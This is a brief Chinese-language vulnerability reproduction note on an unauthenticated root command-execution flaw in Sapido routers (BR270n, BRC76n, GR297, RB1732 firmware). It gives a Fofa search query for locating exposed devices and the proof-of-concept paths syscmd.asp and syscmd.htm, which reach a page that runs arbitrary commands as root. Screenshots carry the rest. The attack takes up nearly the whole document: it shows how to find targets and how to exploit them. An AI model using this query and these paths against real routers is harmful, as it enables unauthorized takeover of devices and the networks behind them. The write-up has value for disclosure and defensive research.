# 漏洞简介

Sapido路由器存在命令执行漏洞，攻击者可通过未授权进入命令执行页面，进而可以root权限执行任意命令。  
http://www.sapido.com.tw/TC/home.htm  
影响版本

    
    
    BR270n-v2.1.03
        BRC76n-v2.1.03
        GR297-v2.1.3
        RB1732-v2.0.43
    

# 漏洞复现

Fofa：app="Sapido-路由器"

![图片.png](https://image.3001.net/images/20211116/1637052263_61936f67117899a97ca8c.png!small)

登录页面

![图片.png](https://image.3001.net/images/20211116/1637052308_61936f9407b53fa777d4c.png!small)

**POC

http://x.x.x.x/syscmd.asp

http://x.x.x.x/syscmd.htm**

![图片.png](https://image.3001.net/images/20211116/1637052347_61936fbbd87fddd09d1d0.png!small)

![图片.png](https://image.3001.net/images/20211116/1637052512_61937060d0636546b671a.png!small)

![图片.png](https://image.3001.net/images/20211116/1637052569_6193709958a2a756d0714.png!small)

